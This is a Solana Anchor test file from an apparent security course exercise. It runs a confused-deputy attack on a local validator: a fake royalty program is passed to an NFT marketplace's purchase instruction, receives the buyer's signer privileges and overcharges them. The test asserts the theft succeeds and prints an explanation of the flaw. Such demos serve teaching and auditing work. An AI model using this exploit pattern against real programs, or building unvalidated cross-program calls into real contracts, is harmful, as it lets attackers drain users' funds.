import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Exercise9 } from "../target/types/exercise_9";
import { FakeRoyaltyProgram } from "../target/types/fake_royalty_program";
import { 
  PublicKey, 
  Keypair, 
  SystemProgram,
  LAMPORTS_PER_SOL 
} from "@solana/web3.js";
import { expect } from "chai";

describe("Confused Deputy Attack Demo", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.Exercise9 as Program<Exercise9>;
  const fakeRoyaltyProgram = anchor.workspace.FakeRoyaltyProgram as Program<FakeRoyaltyProgram>;
  const provider = anchor.getProvider();

  // Test accounts
  let seller: Keypair;
  let buyer: Keypair;
  let nftMint: PublicKey;
  let listingPda: PublicKey;
  let escrowPda: PublicKey;

  before(async () => {
    // Create test keypairs
    seller = Keypair.generate();
    buyer = Keypair.generate();
    nftMint = Keypair.generate().publicKey;

    // Fund accounts
    await provider.connection.requestAirdrop(seller.publicKey, 2 * LAMPORTS_PER_SOL);
    await provider.connection.requestAirdrop(buyer.publicKey, 5 * LAMPORTS_PER_SOL);
    
    // Wait for airdrops to confirm
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Calculate PDAs
    [listingPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("listing"),
        seller.publicKey.toBuffer(),
        nftMint.toBuffer(),
      ],
      program.programId
    );

    [escrowPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("escrow"),
        seller.publicKey.toBuffer(),
        nftMint.toBuffer(),
      ],
      program.programId
    );

    // Create NFT listing
    const price = new anchor.BN(1 * LAMPORTS_PER_SOL); // 1 SOL

    await program.methods
      .createListing(nftMint, price)
      .accounts({
        listing: listingPda,
        escrow: escrowPda,
        seller: seller.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([seller])
      .rpc();

    console.log("✅ Setup complete - NFT listing created");
    console.log(`   Listing PDA: ${listingPda.toString()}`);
    console.log(`   Escrow PDA: ${escrowPda.toString()}`);
  });

  it("🚨 VULNERABILITY DEMO: Confused Deputy Attack with Malicious Royalty Program", async () => {
    console.log("\n" + "=".repeat(80));
    console.log("🚨 DEMONSTRATING CONFUSED DEPUTY ATTACK");
    console.log("=".repeat(80));

    const royaltyPercentage = 10; // 10% royalty

    console.log(`\n🎯 ATTACK SCENARIO:`);
    console.log(`   1. Buyer wants to purchase NFT with 10% royalty`);
    console.log(`   2. 🚨 ATTACKER provides MALICIOUS ROYALTY PROGRAM address`);
    console.log(`   3. Marketplace makes CPI to malicious program WITH BUYER'S SIGNER PRIVILEGES`);
    console.log(`   4. 💰 Malicious program steals 10x the expected royalty amount`);

    // 📊 RECORD INITIAL BALANCE
    const buyerBalanceBefore = await provider.connection.getBalance(buyer.publicKey);
    const escrowBalanceBefore = await provider.connection.getBalance(escrowPda);
    
    console.log(`\n💰 BALANCE ANALYSIS - BEFORE ATTACK:`);
    console.log(`   Buyer balance: ${buyerBalanceBefore / LAMPORTS_PER_SOL} SOL`);
    console.log(`   Escrow balance: ${escrowBalanceBefore / LAMPORTS_PER_SOL} SOL`);

    // Calculate expected payments
    const nftPrice = 1 * LAMPORTS_PER_SOL; // 1 SOL (from listing creation)
    const expectedRoyaltyAmount = 0.1 * LAMPORTS_PER_SOL; // 0.1 SOL expected royalty
    const expectedTotalPayment = nftPrice + expectedRoyaltyAmount; // 1.1 SOL total expected
    
    console.log(`   NFT Price: ${nftPrice / LAMPORTS_PER_SOL} SOL`);
    console.log(`   Expected royalty payment: ${expectedRoyaltyAmount / LAMPORTS_PER_SOL} SOL`);
    console.log(`   Expected TOTAL payment: ${expectedTotalPayment / LAMPORTS_PER_SOL} SOL`);

    console.log(`\n🚨 EXECUTING ATTACK...`);
    console.log(`   Malicious "royalty program": ${fakeRoyaltyProgram.programId.toString()}`);
    console.log(`   Target victim (buyer): ${buyer.publicKey.toString()}`);

    try {
      // 🚨 THE ATTACK: Pass malicious program as "royalty program" 🚨
      const tx = await program.methods
        .purchaseNftWithRoyalties(royaltyPercentage)
        .accounts({
          listing: listingPda,
          escrow: escrowPda,
          buyer: buyer.publicKey,
          royaltyProgram: fakeRoyaltyProgram.programId, // 🚨 MALICIOUS PROGRAM! 🚨
          seller: seller.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([buyer])
        .rpc();

      console.log(`\n💥 CONFUSED DEPUTY ATTACK COMPLETED!`);
      console.log(`   Transaction: ${tx}`);

      // 📊 RECORD FINAL BALANCE
      const buyerBalanceAfter = await provider.connection.getBalance(buyer.publicKey);
      const escrowBalanceAfter = await provider.connection.getBalance(escrowPda);

      console.log(`\n💰 BALANCE ANALYSIS - AFTER ATTACK:`);
      console.log(`   Buyer balance: ${buyerBalanceAfter / LAMPORTS_PER_SOL} SOL`);
      console.log(`   Escrow balance: ${escrowBalanceAfter / LAMPORTS_PER_SOL} SOL`);

      // 🚨 THEFT ANALYSIS
      const actualTotalPaid = buyerBalanceBefore - buyerBalanceAfter;
      const escrowIncrease = escrowBalanceAfter - escrowBalanceBefore;
      const extraAmountStolen = actualTotalPaid - expectedTotalPayment;

      console.log(`\n🚨 THEFT ANALYSIS:`);
      console.log(`   Expected TOTAL payment: ${expectedTotalPayment / LAMPORTS_PER_SOL} SOL (NFT price + royalty)`);
      console.log(`   Actual TOTAL paid by buyer: ${actualTotalPaid / LAMPORTS_PER_SOL} SOL`);
      console.log(`   Amount transferred to escrow: ${escrowIncrease / LAMPORTS_PER_SOL} SOL`);
      console.log(`   💰 EXTRA STOLEN: ${extraAmountStolen / LAMPORTS_PER_SOL} SOL`);
      
      if (extraAmountStolen > 0) {
        const theftMultiplier = actualTotalPaid / expectedTotalPayment;
        console.log(`   🚨 PAYMENT MULTIPLIER: ${theftMultiplier.toFixed(2)}x the expected total!`);
        console.log(`   💸 VICTIM LOSS: Buyer lost ${extraAmountStolen / LAMPORTS_PER_SOL} SOL more than expected!`);
        
        // Break down the theft
        const actualRoyaltyPaid = actualTotalPaid - nftPrice;
        const royaltyTheftMultiplier = actualRoyaltyPaid / expectedRoyaltyAmount;
        console.log(`   📊 ROYALTY BREAKDOWN:`);
        console.log(`      Expected royalty: ${expectedRoyaltyAmount / LAMPORTS_PER_SOL} SOL`);
        console.log(`      Actual royalty charged: ${actualRoyaltyPaid / LAMPORTS_PER_SOL} SOL`);
        console.log(`      Royalty theft multiplier: ${royaltyTheftMultiplier.toFixed(1)}x`);
      }

      // Get and display program logs
      const txDetails = await provider.connection.getTransaction(tx, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0
      });
      
      if (txDetails?.meta?.logMessages) {
        console.log(`\n🔍 MALICIOUS PROGRAM LOGS:`);
        
        // Filter and show the most relevant logs
        txDetails.meta.logMessages
          .filter(log => 
            log.includes("[ROYALTY PROGRAM]") || 
            log.includes("🚨") || 
            log.includes("💰") ||
            log.includes("STEALING") ||
            log.includes("SUCCESS")
          )
          .forEach((log, index) => {
            console.log(`   ${log}`);
          });

        // Check if the attack succeeded by verifying buyer lost more than expected
        const attackSucceeded = extraAmountStolen > 0;

        if (!attackSucceeded) {
          throw new Error("Attack failed - buyer did not lose more SOL than the expected total payment");
        }
      }

      // Verify the theft occurred
      expect(actualTotalPaid).to.be.greaterThan(expectedTotalPayment);
      console.log(`\n✅ TEST ASSERTION PASSED: Buyer paid more than expected total (NFT + royalty)`);

    } catch (error) {
      throw new Error("Confused deputy attack failed: " + error.message);
    }

    console.log(`\n💡 VULNERABILITY EXPLANATION:`);
    console.log(`   🔴 PROBLEM: No validation of 'royalty_program' parameter`);
    console.log(`   🔴 PROBLEM: CPI propagates caller's signer privileges to arbitrary program`);
    console.log(`   🔴 PROBLEM: Malicious program received buyer's signing authority`);

    console.log("\n" + "=".repeat(80));
  });
});

// cd lecture_3/exercise_9 && solana-test-validator --reset
// anchor build && anchor deploy && anchor test --skip-local-validator --skip-build
